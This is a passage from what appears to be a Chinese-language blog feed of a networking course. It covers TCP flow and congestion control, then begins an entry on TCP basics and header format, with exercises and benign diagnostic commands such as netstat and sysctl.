接收方缓冲区满，发送Window=0<br><span class="hljs-bullet">2.</span> 发送方停止发送<br><span class="hljs-bullet">3.</span> 接收方处理数据，缓冲区有空间<br><span class="hljs-bullet">4.</span> 但如果ACK丢失，发送方不知道可以继续发送<br><br>解决：零窗口探测<br>发送方定期发送零窗口探测段（1字节数据）<br>询问接收方是否有可用窗口<br></code></pre></td></tr></table></figure><p><strong>糊涂窗口综合症（Silly Window Syndrome）</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">问题：<br>接收方每次只读取很少数据<br>导致频繁发送小窗口通告<br>发送方发送大量小数据段<br>效率低下<br><br>示例：<br>缓冲区8KB，应用每次读1字节<br>Window序列：0, 1, 0, 1, 0, 1...<br>效率：极低 ❌<br><br>解决方案：<br><span class="hljs-bullet">1.</span> 接收方（Clark算法）<br><span class="hljs-bullet">   -</span> 缓冲区空间 &lt; MSS时，通告Window=0<br><span class="hljs-bullet">   -</span> 直到有足够空间（MSS或缓冲区一半）<br><br><span class="hljs-bullet">2.</span> 发送方（Nagle算法）<br><span class="hljs-bullet">   -</span> 等待数据累积到MSS大小再发送<br><span class="hljs-bullet">   -</span> 或收到之前数据的ACK再发送<br></code></pre></td></tr></table></figure><hr><h2 id="7-拥塞控制"><a href="#7-拥塞控制" class="headerlink" title="7. 拥塞控制"></a>7. 拥塞控制</h2><h3 id="7-1-拥塞控制-vs-流量控制"><a href="#7-1-拥塞控制-vs-流量控制" class="headerlink" title="7.1 拥塞控制 vs 流量控制"></a>7.1 拥塞控制 vs 流量控制</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">流量控制（Flow Control）：<br><span class="hljs-bullet">- </span>目标：防止接收方过载<br><span class="hljs-bullet">- </span>机制：接收窗口（rwnd）<br><span class="hljs-bullet">- </span>控制：接收方控制发送方<br><br>拥塞控制（Congestion Control）：<br><span class="hljs-bullet">- </span>目标：防止网络过载<br><span class="hljs-bullet">- </span>机制：拥塞窗口（cwnd）<br><span class="hljs-bullet">- </span>控制：发送方自己判断<br><br>发送窗口 = min(rwnd, cwnd)<br></code></pre></td></tr></table></figure><h3 id="7-2-拥塞控制算法"><a href="#7-2-拥塞控制算法" class="headerlink" title="7.2 拥塞控制算法"></a>7.2 拥塞控制算法</h3><p><strong>1. 慢启动（Slow Start）</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的：<br>连接初期探测网络容量<br><br>算法：<br>1. 初始cwnd = 1 MSS (或更大，如10 MSS)<br>2. 每收到一个ACK，cwnd += 1<br>3. 效果：cwnd指数增长（每个RTT翻倍）<br><br>示例：<br>RTT 0: <span class="hljs-attribute">cwnd</span>=1,  发送1个段<br>RTT 1: <span class="hljs-attribute">cwnd</span>=2,  发送2个段<br>RTT 2: <span class="hljs-attribute">cwnd</span>=4,  发送4个段<br>RTT 3: <span class="hljs-attribute">cwnd</span>=8,  发送8个段<br><span class="hljs-built_in">..</span>.<br><br>终止条件：<br>- cwnd &gt;= ssthresh（慢启动阈值）<br>  → 进入拥塞避免<br>- 发生丢包<br>  → 进入拥塞避免或快速恢复<br></code></pre></td></tr></table></figure><p><strong>2. 拥塞避免（Congestion Avoidance）</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的：<br>小心翼翼地增加窗口，避免拥塞<br><br>算法：<br>每收到一个ACK：<br>cwnd = cwnd + 1/cwnd<br><br>效果：每个RTT，cwnd增加1<br><br>示例：<br>RTT 0: <span class="hljs-attribute">cwnd</span>=16<br>RTT 1: <span class="hljs-attribute">cwnd</span>=17<br>RTT 2: <span class="hljs-attribute">cwnd</span>=18<br>RTT 3: <span class="hljs-attribute">cwnd</span>=19<br><span class="hljs-built_in">..</span>.<br><br>特点：线性增长（比慢启动慢得多）<br></code></pre></td></tr></table></figure><p><strong>3. 拥塞发生</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">情况1：超时（丢包严重）<br>行为：<br><span class="hljs-bullet">- </span>ssthresh = cwnd / 2<br><span class="hljs-bullet">- </span>cwnd = 1 MSS<br><span class="hljs-bullet">- </span>重新慢启动<br><br>情况2：3个重复ACK（丢包较轻）<br>行为：<br><span class="hljs-bullet">- </span>ssthresh = cwnd / 2<br><span class="hljs-bullet">- </span>cwnd = ssthresh + 3<br><span class="hljs-bullet">- </span>快速重传 + 快速恢复<br></code></pre></td></tr></table></figure><p><strong>4. 快速恢复（Fast Recovery）</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">算法：<br><span class="hljs-bullet">1.</span> ssthresh = cwnd / 2<br><span class="hljs-bullet">2.</span> cwnd = ssthresh + 3<br><span class="hljs-bullet">3.</span> 重传丢失的段<br><span class="hljs-bullet">4.</span> 每收到重复ACK，cwnd += 1（临时膨胀）<br><span class="hljs-bullet">5.</span> 收到新ACK时，cwnd = ssthresh<br><span class="hljs-bullet">6.</span> 进入拥塞避免<br><br>目的：<br><span class="hljs-bullet">-</span> 快速恢复，不回到慢启动<br><span class="hljs-bullet">-</span> 维持较高吞吐量<br></code></pre></td></tr></table></figure><h3 id="7-3-拥塞控制状态图"><a href="#7-3-拥塞控制状态图" class="headerlink" title="7.3 拥塞控制状态图"></a>7.3 拥塞控制状态图</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros">         [连接建立]<br>              ↓<br>        ┌──────────┐<br>        │ 慢启动    │ cwnd指数增长<br>        │          │ 每ACK: cwnd += 1<br>        └──────────┘<br>              ↓<br>      cwnd &gt;= ssthresh<br>              ↓<br>        ┌──────────┐<br>        │拥塞避免   │ cwnd线性增长<br>        │          │ 每RTT: cwnd += 1<br>        └──────────┘<br>              ↓<br>          发生丢包<br>           ↙    ↘<br>    超时         3个重复ACK<br>      ↓               ↓<br>┌──────────┐    ┌──────────┐<br>│ 慢启动    │    │快速恢复   │<br>│<span class="hljs-attribute">cwnd</span>=1    │    │<span class="hljs-attribute">cwnd</span>=ssthresh/2+3│<br>└──────────┘    └──────────┘<br>      ↓               ↓<br>      └───────┬───────┘<br>              ↓<br>        ┌──────────┐<br>        │拥塞避免   │<br>        └──────────┘<br></code></pre></td></tr></table></figure><h3 id="7-4-拥塞控制变体"><a href="#7-4-拥塞控制变体" class="headerlink" title="7.4 拥塞控制变体"></a>7.4 拥塞控制变体</h3><p><strong>TCP Reno（经典算法）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>慢启动 <span class="hljs-code">+ 拥塞避免 +</span> 快速重传 + 快速恢复<br><span class="hljs-bullet">- </span>最经典的TCP实现<br><br>问题：<br><span class="hljs-bullet">- </span>对多个丢包处理不好<br><span class="hljs-bullet">- </span>每个RTT只能恢复一个丢包<br></code></pre></td></tr></table></figure><p><strong>TCP NewReno</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">改进：<br><span class="hljs-bullet">- </span>改进的快速恢复<br><span class="hljs-bullet">- </span>可以在一个RTT内恢复多个丢包<br><br>特点：<br><span class="hljs-bullet">- </span>部分ACK触发重传<br><span class="hljs-bullet">- </span>直到所有丢失数据恢复才退出快速恢复<br></code></pre></td></tr></table></figure><p><strong>TCP CUBIC（Linux默认）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>窗口增长函数：cwnd = C(t - K)^3 + W_max<br><span class="hljs-bullet">- </span>更适合高带宽长延迟网络<br><br>优点：<br><span class="hljs-bullet">- </span>快速探测可用带宽<br><span class="hljs-bullet">- </span>公平性更好<br><span class="hljs-bullet">- </span>高速网络性能更好<br></code></pre></td></tr></table></figure><p><strong>TCP BBR（Google）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">理念：<br><span class="hljs-bullet">- </span>不基于丢包，基于RTT和带宽<br><span class="hljs-bullet">- </span>主动探测瓶颈带宽和RTT<br><br>特点：<br><span class="hljs-bullet">- </span>4个状态：Startup, Drain, ProbeBW, ProbeRTT<br><span class="hljs-bullet">- </span>更高吞吐量<br><span class="hljs-bullet">- </span>更低延迟<br></code></pre></td></tr></table></figure><hr><h2 id="8-实战项目：TCP可靠性分析工具"><a href="#8-实战项目：TCP可靠性分析工具" class="headerlink" title="8. 实战项目：TCP可靠性分析工具"></a>8. 实战项目：TCP可靠性分析工具</h2><h3 id="8-1-项目功能"><a href="#8-1-项目功能" class="headerlink" title="8.1 项目功能"></a>8.1 项目功能</h3><p>实现工具分析：</p><ol><li>TCP连接的重传统计</li><li>RTT和RTO监控</li><li>窗口大小变化</li><li>拥塞控制状态</li></ol><h3 id="8-2-工具演示"><a href="#8-2-工具演示" class="headerlink" title="8.2 工具演示"></a>8.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监控TCP重传</span><br>python day16_tcp_reliability.py --monitor-retrans<br><br><span class="hljs-comment"># 分析RTT</span><br>python day16_tcp_reliability.py --analyze-rtt<br><br><span class="hljs-comment"># 模拟拥塞控制</span><br>python day16_tcp_reliability.py --simulate-congestion<br><br><span class="hljs-comment"># 窗口大小分析</span><br>python day16_tcp_reliability.py --window-analysis<br></code></pre></td></tr></table></figure><hr><h2 id="9-今日练习"><a href="#9-今日练习" class="headerlink" title="9. 今日练习"></a>9. 今日练习</h2><h3 id="练习1：观察重传"><a href="#练习1：观察重传" class="headerlink" title="练习1：观察重传"></a>练习1：观察重传</h3><p>使用Wireshark：</p><ol><li>访问一个网站</li><li>筛选：<code>tcp.analysis.retransmission</code></li><li>观察重传的段</li><li>分析重传原因（超时&#x2F;快速重传）</li></ol><h3 id="练习2：计算RTO"><a href="#练习2：计算RTO" class="headerlink" title="练习2：计算RTO"></a>练习2：计算RTO</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coq">给定RTT样本：<span class="hljs-number">100</span>ms, <span class="hljs-number">120</span>ms, <span class="hljs-number">90</span>ms, <span class="hljs-number">110</span>ms<br><br>计算：<br><span class="hljs-number">1.</span> SRTT (Smoothed RTT)<br><span class="hljs-number">2.</span> RTTVAR (RTT Variation)<br><span class="hljs-number">3.</span> RTO (Retransmission <span class="hljs-keyword">Timeout</span>)<br><br>使用公式：<br>SRTT = (<span class="hljs-number">1</span>-α) × SRTT + α × RTT_sample<br>RTTVAR = (<span class="hljs-number">1</span>-β) × RTTVAR + β × |<span class="hljs-type">SRTT</span> - RTT_sample|<br><span class="hljs-type">RTO</span> = SRTT + <span class="hljs-number">4</span> × RTTVAR<br></code></pre></td></tr></table></figure><h3 id="练习3：模拟拥塞控制"><a href="#练习3：模拟拥塞控制" class="headerlink" title="练习3：模拟拥塞控制"></a>练习3：模拟拥塞控制</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">场景：<br><span class="hljs-bullet">-</span> 初始cwnd = 1 MSS<br><span class="hljs-bullet">-</span> ssthresh = 16 MSS<br><span class="hljs-bullet">-</span> MSS = 1460 字节<br><br>问题：<br><span class="hljs-bullet">1.</span> 经过多少个RTT，cwnd达到16？<br><span class="hljs-bullet">2.</span> 如果在cwnd=20时发生超时，新的cwnd和ssthresh是多少？<br><span class="hljs-bullet">3.</span> 如果在cwnd=20时收到3个重复ACK，cwnd和ssthresh是多少？<br></code></pre></td></tr></table></figure><h3 id="练习4：查看TCP统计"><a href="#练习4：查看TCP统计" class="headerlink" title="练习4：查看TCP统计"></a>练习4：查看TCP统计</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux查看TCP统计</span><br>netstat -s | grep -i tcp<br>ss -ti  <span class="hljs-comment"># 查看TCP详细信息</span><br><br><span class="hljs-comment"># 查看重传统计</span><br>netstat -s | grep retrans<br><br><span class="hljs-comment"># 查看拥塞控制算法</span><br>sysctl net.ipv4.tcp_congestion_control<br></code></pre></td></tr></table></figure><hr><h2 id="10-常见问题"><a href="#10-常见问题" class="headerlink" title="10. 常见问题"></a>10. 常见问题</h2><p><strong>Q1：为什么是3个重复ACK触发快速重传，而不是2个或4个？</strong></p><p>A：这是经验值的平衡：</p><ul><li>2个：可能误判（乱序到达）</li><li>3个：较可靠地判断丢包</li><li>4个：太保守，影响效率</li></ul><p><strong>Q2：TCP如何区分网络拥塞和接收方慢？</strong></p><p>A：</p><ul><li>网络拥塞：超时或3个重复ACK</li><li>接收方慢：Window字段变小</li><li>TCP会相应调整发送速度</li></ul><p><strong>Q3：为什么慢启动要指数增长？</strong></p><p>A：</p><ul><li>快速探测可用带宽</li><li>避免初期过于保守</li><li>遇到拥塞时能快速反应</li></ul><p><strong>Q4：选择性确认（SACK）是必须的吗？</strong></p><p>A：</p><ul><li>不是必须，但强烈推荐</li><li>没有SACK时效率较低</li><li>现代TCP实现基本都支持SACK</li></ul><hr><h2 id="11-总结"><a href="#11-总结" class="headerlink" title="11. 总结"></a>11. 总结</h2><p>今天我们深入学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>序列号和确认号</strong>：</p><ul><li>序列号标识字节位置</li><li>确认号表示期望接收的下一个字节</li><li>累积确认机制</li></ul></li><li><p><strong>滑动窗口</strong>：</p><ul><li>提高传输效率</li><li>发送窗口和接收窗口</li><li>窗口大小 &#x3D; min(rwnd, cwnd)</li></ul></li><li><p><strong>超时重传</strong>：</p><ul><li>RTO动态计算（Jacobson算法）</li><li>Karn算法解决重传歧义</li><li>指数退避</li></ul></li><li><p><strong>快速重传和快速恢复</strong>：</p><ul><li>3个重复ACK触发</li><li>不等超时，立即重传</li><li>SACK提高效率</li></ul></li><li><p><strong>流量控制</strong>：</p><ul><li>防止接收方过载</li><li>零窗口处理</li><li>糊涂窗口综合症</li></ul></li><li><p><strong>拥塞控制</strong>：</p><ul><li>慢启动（指数增长）</li><li>拥塞避免（线性增长）</li><li>快速恢复</li><li>多种算法变体</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP可靠传输 = 序列号 <span class="hljs-code">+ 确认 +</span> 重传 + 窗口<br><br>效率优化：<br><span class="hljs-bullet">- </span>滑动窗口（批量发送）<br><span class="hljs-bullet">- </span>快速重传（不等超时）<br><span class="hljs-bullet">- </span>SACK（选择性确认）<br><br>网络友好：<br><span class="hljs-bullet">- </span>流量控制（保护接收方）<br><span class="hljs-bullet">- </span>拥塞控制（保护网络）<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第17天：UDP协议详解</strong></p><p>内容预览：</p><ul><li>UDP报文格式</li><li>UDP vs TCP深入对比</li><li>UDP应用场景</li><li>UDP编程实战</li><li>基于UDP实现可靠传输</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了TCP如何实现可靠传输，这是TCP最核心的功能。理解这些机制不仅能帮助你更好地使用TCP，还能在遇到网络问题时快速定位原因！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>15天：TCP协议基础</title>
    <link href="/2025/11/10/15%E5%A4%A9%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/15%E5%A4%A9%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="第15天：TCP协议基础"><a href="#第15天：TCP协议基础" class="headerlink" title="第15天：TCP协议基础"></a>第15天：TCP协议基础</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解TCP协议的核心特性</li><li>掌握TCP报文格式</li><li>深入理解TCP三次握手过程</li><li>深入理解TCP四次挥手过程</li><li>掌握TCP状态机转换</li><li>实现TCP连接分析工具</li></ul><hr><h2 id="1-TCP协议概述"><a href="#1-TCP协议概述" class="headerlink" title="1. TCP协议概述"></a>1. TCP协议概述</h2><h3 id="1-1-什么是TCP？"><a href="#1-1-什么是TCP？" class="headerlink" title="1.1 什么是TCP？"></a>1.1 什么是TCP？</h3><p><strong>TCP（Transmission Control Protocol，传输控制协议）</strong> 是互联网协议套件中最重要的协议之一。</p><p><strong>生活类比</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCP就像打电话：<br><span class="hljs-bullet">1.</span> 拨号等待对方接听（建立连接）<br><span class="hljs-bullet">2.</span> 双方确认能听清楚（三次握手）<br><span class="hljs-bullet">3.</span> 开始对话（数据传输）<br><span class="hljs-bullet">4.</span> 说&quot;再见&quot;挂断电话（四次挥手）<br><br>特点：<br>✅ 可靠：说的每句话对方都能听到<br>✅ 有序：对话内容按顺序传递<br>✅ 面向连接：必须先建立连接才能通话<br></code></pre></td></tr></table></figure><h3 id="1-2-TCP的核心特性"><a href="#1-2-TCP的核心特性" class="headerlink" title="1.2 TCP的核心特性"></a>1.2 TCP的核心特性</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCP = 可靠的、面向连接的、字节流协议<br><br><span class="hljs-bullet">1.</span> 面向连接（Connection-Oriented）<br>   ├── 通信前必须建立连接<br>   ├── 通信后必须释放连接<br>   └── 类似打电话<br><br><span class="hljs-bullet">2.</span> 可靠传输（Reliable）<br>   ├── 数据不丢失<br>   ├── 数据不重复<br>   ├── 数据按序到达<br>   └── 通过确认和重传机制实现<br><br><span class="hljs-bullet">3.</span> 全双工通信（Full-Duplex）<br>   ├── 双方可同时发送和接收<br>   └── 类似电话可以双向对话<br><br><span class="hljs-bullet">4.</span> 字节流服务（Byte Stream）<br>   ├── 面向字节流，不是消息流<br>   ├── 应用层交给TCP的数据可能被拆分或合并<br>   └── 没有消息边界<br><br><span class="hljs-bullet">5.</span> 流量控制（Flow Control）<br>   ├── 防止发送方发送过快<br>   └── 通过滑动窗口实现<br><br><span class="hljs-bullet">6.</span> 拥塞控制（Congestion Control）<br>   ├── 防止网络过载<br>   └── 慢启动、拥塞避免等算法<br></code></pre></td></tr></table></figure><h3 id="1-3-TCP-vs-UDP"><a href="#1-3-TCP-vs-UDP" class="headerlink" title="1.3 TCP vs UDP"></a>1.3 TCP vs UDP</h3><table><thead><tr><th>特性</th><th>TCP</th><th>UDP</th></tr></thead><tbody><tr><td><strong>连接</strong></td><td>面向连接</td><td>无连接</td></tr><tr><td><strong>可靠性</strong></td><td>可靠（确认+重传）</td><td>不可靠（尽力而为）</td></tr><tr><td><strong>顺序</strong></td><td>保证顺序</td><td>不保证顺序</td></tr><tr><td><strong>速度</strong></td><td>较慢（开销大）</td><td>快速（开销小）</td></tr><tr><td><strong>头部开销</strong></td><td>20-60字节</td><td>8字节</td></tr><tr><td><strong>流量控制</strong></td><td>有</td><td>无</td></tr><tr><td><strong>拥塞控制</strong></td><td>有</td><td>无</td></tr><tr><td><strong>数据边界</strong></td><td>字节流（无边界）</td><td>数据报（有边界）</td></tr><tr><td><strong>应用场景</strong></td><td>HTTP、FTP、邮件</td><td>DNS、视频、游戏</td></tr></tbody></table><p><strong>使用场景对比</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs">选择TCP：<br>✅ 需要可靠传输（文件下载、网页浏览）<br>✅ 数据完整性重要（银行转账、邮件）<br>✅ 顺序很重要（聊天消息）<br><br>选择UDP：<br>✅ 实时性要求高（视频通话、游戏）<br>✅ 可以容忍少量丢包（直播、语音）<br>✅ 数据量小且频繁（DNS查询）<br>✅ 广播/组播通信<br></code></pre></td></tr></table></figure><hr><h2 id="2-TCP报文格式"><a href="#2-TCP报文格式" class="headerlink" title="2. TCP报文格式"></a>2. TCP报文格式</h2><h3 id="2-1-TCP段结构"><a href="#2-1-TCP段结构" class="headerlink" title="2.1 TCP段结构"></a>2.1 TCP段结构</h3><p>TCP传输的数据单元称为<strong>段（Segment）</strong>：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">TCP段 </span>=<span class="hljs-string"> TCP头部 + 数据</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌─────────────────────────────────────────────────────┐</span><br><span class="hljs-string">│                    TCP 头部                          │</span><br><span class="hljs-string">│                  (20-60 字节)                        │</span><br><span class="hljs-string">├─────────────────────────────────────────────────────┤</span><br><span class="hljs-string">│                    应用数据                          │</span><br><span class="hljs-string">│                   (可变长度)                         │</span><br><span class="hljs-string">└─────────────────────────────────────────────────────┘</span><br></code></pre></td></tr></table></figure><h3 id="2-2-TCP头部格式（20字节最小）"><a href="#2-2-TCP头部格式（20字节最小）" class="headerlink" title="2.2 TCP头部格式（20字节最小）"></a>2.2 TCP头部格式（20字节最小）</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|          源端口 (16位)         |        目标端口 (16位)         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                        序列号 (32位)                           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                      确认号 (32位)                             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|  头部  |       |C|E|U|A|P|R|S|F|                               |<br>|  长度  | 保留  |W|C|R|C|S|S|Y|I|          窗口大小 (16位)       |<br><span class="hljs-section">|  (4位) | (3位) |R|E|G|K|H|T|N|N|                               |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|          校验和 (16位)         |        紧急指针 (16位)         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    选项 (可变长度，最多40字节)                  |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                          数据                                  |</span><br><span 